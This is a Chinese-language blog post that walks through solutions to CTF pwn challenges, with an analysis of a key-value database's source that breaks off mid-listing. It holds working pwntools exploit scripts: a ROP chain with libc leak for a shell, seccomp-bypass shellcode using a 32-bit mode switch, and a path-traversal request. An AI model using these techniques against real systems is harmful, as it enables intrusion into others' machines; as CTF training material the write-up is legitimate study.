<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="![img](file:&#x2F;&#x2F;&#x2F;C:\Users\张鹏\Documents\Tencent Files\2220323423\Image\C2C(}RLTKRW2)0W46[NJBY[R&#96;A.png)  pwn1一道有点点麻烦的scanf栈溢出，给了两次任意改和一次74字节的scanf输入机会，所以可以通过任意改改TLS储存的canary的值，不过只有在线程中才canary的储存位置才离栈很近，可以">
<meta property="og:type" content="article">
<meta property="og:title" content="MninL-CTF-pwn">
<meta property="og:url" content="http://example.com/2022/05/11/MninL-CTF-pwn/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="![img](file:&#x2F;&#x2F;&#x2F;C:\Users\张鹏\Documents\Tencent Files\2220323423\Image\C2C(}RLTKRW2)0W46[NJBY[R&#96;A.png)  pwn1一道有点点麻烦的scanf栈溢出，给了两次任意改和一次74字节的scanf输入机会，所以可以通过任意改改TLS储存的canary的值，不过只有在线程中才canary的储存位置才离栈很近，可以">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="c:/Users/张鹏/AppData/Roaming/Typora/typora-user-images/image-20220511133825521.png">
<meta property="og:image" content="c:/Users/张鹏/AppData/Roaming/Typora/typora-user-images/image-20220511135849068.png">
<meta property="article:published_time" content="2022-05-11T11:19:42.000Z">
<meta property="article:modified_time" content="2022-05-11T11:20:13.880Z">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:/Users/张鹏/AppData/Roaming/Typora/typora-user-images/image-20220511133825521.png">

<link rel="canonical" href="http://example.com/2022/05/11/MninL-CTF-pwn/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>MninL-CTF-pwn | study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/11/MninL-CTF-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          MninL-CTF-pwn
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-05-11 19:19:42 / 修改时间：19:20:13" itemprop="dateCreated datePublished" datetime="2022-05-11T19:19:42+08:00">2022-05-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>![img](file:///C:\Users\张鹏\Documents\Tencent Files\2220323423\Image\C2C(}RLTKRW2)0W46[NJBY[R`A.png)</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220511133825521.png" alt="image-20220511133825521"></p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>一道有点点麻烦的scanf栈溢出，给了两次任意改和一次74字节的scanf输入机会，所以可以通过任意改改TLS储存的canary的值，不过只有在线程中才canary的储存位置才离栈很近，可以通过栈改，在进程中都是储存在fs段，离栈非常远就不好更改了，然后通过scanf的栈溢出搞个ogg就能getshell了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_LIBRARY_PATH&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/&#x27;&#125;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10015</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">b=<span class="string">&#x27;b *&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x40142E</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,b)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Add new god:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;Name: &quot;</span>,content.ljust(<span class="number">7</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Do you know who is the God of XDSEC? (*^_^*)&quot;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    edit(<span class="number">272</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">10</span>,p64(<span class="number">0x401236</span>))</span><br><span class="line">    pop_rdi=<span class="number">0x00000000004015d3</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">3</span>-<span class="number">1</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(elf.got[<span class="string">&quot;puts&quot;</span>])+p64(elf.plt[<span class="string">&quot;puts&quot;</span>])+p64(<span class="number">0x401236</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Finally, what&#x27;s your name?&quot;</span>)</span><br><span class="line">    sh.sendline(pay)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Finally, what&#x27;s your name?&quot;</span>)</span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">3</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x0000000000034580</span>)+p64(libc_base+<span class="number">0xe3b34</span>)</span><br><span class="line">    sh.sendline(pay)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn2-shellcode"><a href="#pwn2-shellcode" class="headerlink" title="pwn2 shellcode"></a>pwn2 shellcode</h2><p>一道有沙箱的shellcode题目，刚开始题目出的有问题，沙箱没有禁用0x40000000,所以可以<code>0x40000000+系统调用号</code>绕过沙箱，本地是成功的，但是远程一直不成功，和出题人反馈后说是题目出错了，最后ban了0x40000000,但是没有ban架构，沙盒如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/xidian/pwn5$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x05 0x00 0x40000000  if (A &gt; 0x40000000) goto 0007</span><br><span class="line"> 0002: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0007</span><br><span class="line"> 0003: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0007</span><br><span class="line"> 0004: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>本质上他允许<code>1 5 0 9</code>这四个系统调用号，在32位下调用号5对应<code>open</code>，这样orw就凑齐了，先在64下利用mmap申请32位地址的地段空间，然后使用<code>retfq</code>转到32位，调用open后调用<code>retfq</code>返回64位，注意32位没有retfq这个指令所以填的是64位的，还有第二个retfq后面必须得还有指令才能执行成功，不然就会出错，最后在64位下调用rw得到flag</p>
<p>基本上是mark佬提供的思路。膜膜</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10057</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot;b *(0x555555554000+0x13C2)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    shellcode1=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbp, rax</span></span><br><span class="line"><span class="string">    mov rax, 9</span></span><br><span class="line"><span class="string">    mov rdi, 0x70707070</span></span><br><span class="line"><span class="string">    mov rsi, 0x100</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov rcx, 34</span></span><br><span class="line"><span class="string">    mov r8, 0xffffffffffffffff</span></span><br><span class="line"><span class="string">    mov r9, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rsi, 0x70707070</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0x400</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov esp, 0x70707a70</span></span><br><span class="line"><span class="string">    mov rax, 0x23</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push 0x70707077</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode2=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov ebx, 0x70707070</span></span><br><span class="line"><span class="string">    mov ecx, 0</span></span><br><span class="line"><span class="string">    mov edx, 0</span></span><br><span class="line"><span class="string">    mov eax, 5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode3=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x70707170</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode4=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi ,3</span></span><br><span class="line"><span class="string">    mov rsi,  0x70707870</span></span><br><span class="line"><span class="string">    mov rdx, 0x40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi,  0x70707870</span></span><br><span class="line"><span class="string">    mov rdx, 0x40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    pay=asm(shellcode1,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    sh.send(pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    pay=<span class="string">&#x27;./flag\x00&#x27;</span>+asm(shellcode2,arch=<span class="string">&#x27;i386&#x27;</span>)+asm(shellcode3,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=asm(shellcode4,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    sh.send(pay.ljust(<span class="number">0x400</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn3-easy-http"><a href="#pwn3-easy-http" class="headerlink" title="pwn3 easy_http"></a>pwn3 easy_http</h2><p>可以任意文件读，就是禁了/<code>home/minil/flag</code>目录，绕过就行了，比如<code>/home/../home/mimil/flag</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10021</span>)</span><br><span class="line">pay=<span class="string">&#x27;GET /home/minil/../minil/flag\r\n&#x27;</span></span><br><span class="line">pay+=<span class="string">&#x27;User-Agent: MiniL\r\n\r\n&#x27;</span></span><br><span class="line">sh.send(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn4-kvdb"><a href="#pwn4-kvdb" class="headerlink" title="pwn4 kvdb"></a>pwn4 kvdb</h2><p>这道题的代码量是我做过的题中最大的，当时审了一会实在审不下去就放弃了，后面出题人鉴于难度太大直接放了源码，才又跑来看这道题，一看源码，好家伙加起来一千多行了，光审明白代码和找见漏洞花了一个晚上。🤦‍♀️</p>
<h3 id="0x1-结构体及关系"><a href="#0x1-结构体及关系" class="headerlink" title="0x1 结构体及关系"></a>0x1 结构体及关系</h3><p>程序实现的是一个简易版本的数据库，把里面的结构体的关系抽象出来就是如下图</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220511135849068.png" alt="image-20220511135849068"></p>
<p>其中比较重要的是<code>data_t</code>结构体了,本质上他有两个成员，一个成员是<code>uint16 type</code>，记录的是这个<code>data_t</code>结构体是什么类型的，0-&gt;empty,1-&gt;int,2-&gt;float,3-&gt;string,然后还有一个union共用题记录成员具体的量。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> uint64 <span class="keyword">data_integer_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> <span class="keyword">data_float_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_string_t</span> &#123;</span></span><br><span class="line">    uint32 len;</span><br><span class="line">    <span class="keyword">char</span>* ptr;</span><br><span class="line">&#125; <span class="keyword">data_string_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data_t</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_array_t</span> &#123;</span></span><br><span class="line">    uint32 count;</span><br><span class="line">    <span class="keyword">data_t</span>** items;</span><br><span class="line">&#125; <span class="keyword">data_array_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">    uint16 type;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">data_integer_t</span> integer;</span><br><span class="line">        <span class="keyword">data_float_t</span> _float;</span><br><span class="line">        <span class="keyword">data_string_t</span> str;</span><br><span class="line">        <span class="keyword">data_array_t</span> <span class="built_in">array</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="keyword">data_t</span>;</span><br></pre></td></tr></table></figure>

<p>这个结构体是0x18大小的，所以会申请0x10大小的堆，然后下一个堆头的前八个字节也给这个堆用。</p>
<h3 id="0x2-大致逻辑"><a href="#0x2-大致逻辑" class="headerlink" title="0x2 大致逻辑"></a>0x2 大致逻辑</h3><p>程序是利用socket和用户进行交互的，程序的启动脚本如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kvdb -p 9999 -m 32 -l /dev/null -t 10 -d</span><br></pre></td></tr></table></figure>

<p>这是程序对命令行参数的解析过程,其中<code>getopt</code>函数就是每次取一个选项，然后把选项对应的值存到optarg中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">&quot;p:m:t:l:hd&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">       <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">               socks_server_port = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">               max_requests = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">               timeout = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">               log_file = (<span class="keyword">char</span> *)optarg;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">               run_daemon = <span class="number">1</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">               <span class="built_in">std</span>::<span class="built_in">cerr</span></span><br><span class="line">                   &lt;&lt; <span class="string">&quot;kvdb [-p &lt;port&gt;] [-m &lt;max_clients&gt;] [-t &lt;timeout sec&gt;] [-l &lt;log file&gt;] [-d]&quot;</span></span><br><span class="line">                   &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">               <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; (<span class="string">&quot;HELP: -h&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>解析完毕后对变量的赋值如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">socks_server_port=<span class="number">9999</span></span><br><span class="line">max_requests=<span class="number">32</span></span><br><span class="line">timeout=<span class="number">10</span></span><br><span class="line">log_file=/dev/null</span><br><span class="line">run_daemon=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>然后就进入了<code>init_daemon()</code>函数，这个函数的作用就是生成守护进程，感觉很有意思可以学习一下，生成守护进程后程序的标准输入输出就脱离终端了，然后进入<code>server_loop()</code>函数创建服务端socket，一直accept等待连接，有连接后再fork一个子进程让子进程处理请求。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">server_loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sock_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">local_addr</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;local_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(local_addr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* new socket (only IPv4 is supported now) */</span></span><br><span class="line">    <span class="keyword">if</span> ((sock_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): Can not create sock_fd!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* reuse addr */</span></span><br><span class="line">    <span class="keyword">int</span> new_optval = <span class="number">1</span>;</span><br><span class="line">    <span 